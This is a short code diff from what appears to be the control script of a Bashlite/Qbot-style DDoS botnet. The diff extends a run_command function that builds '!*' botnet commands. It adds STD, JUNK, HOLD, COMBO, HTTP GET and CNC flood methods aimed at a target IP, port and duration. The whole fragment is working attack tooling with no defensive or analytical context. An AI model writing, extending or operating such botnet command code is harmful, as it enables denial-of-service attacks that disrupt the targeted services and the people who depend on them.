@@ -27,6 +27,18 @@ def run_command():
         command = "!* " + method + " " + ip + " " + port + " " + time + " 32 " + size + " 10"
     elif(method == "TCP"):
         command = "!* " + method + " " + ip + " " + port + " " + time + " 32 all " + size + " 10"
+    elif(method == "STD"):
+        command = "!* " + method + " " + ip + " " + port + " " + time
+    elif(method == "JUNK"):
+        command = "!* " + method + " " + ip + " " + port + " " + time
+    elif(method == "HOLD"):
+        command = "!* " + method + " " + ip + " " + port + " " + time
+    elif(method == "COMBO"):
+        command = "!* " + method + " " + ip + " " + port + " " + time
+    elif(method == "HTTP"):
+        command = "!* " + method + " GET " + ip + " " + port + " / " + time + " " + size
+    elif(method == "CNC"):
+        command = "!* " + method + " " + ip + " " + port + " " + time
     elif(method == "HEX"):
         command = "!* " + method + " " + ip + " " + port + " " + time + " " + size
     elif(method == "STOP"):
